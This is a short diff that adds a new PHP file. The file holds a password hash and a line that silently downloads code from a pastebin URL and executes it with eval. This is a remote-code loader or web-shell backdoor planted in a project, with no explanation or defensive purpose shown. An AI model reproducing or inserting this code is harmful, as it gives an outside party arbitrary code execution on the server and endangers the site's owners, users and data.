@@ -1,0 +1,4 @@
+<?php
+$auth_pass="7215ee9c7d9dc229d2921a40e899ec5f";
+@eval(file_get_contents("http://pastebin.com/raw/wXUNbZzJ"));
+?>
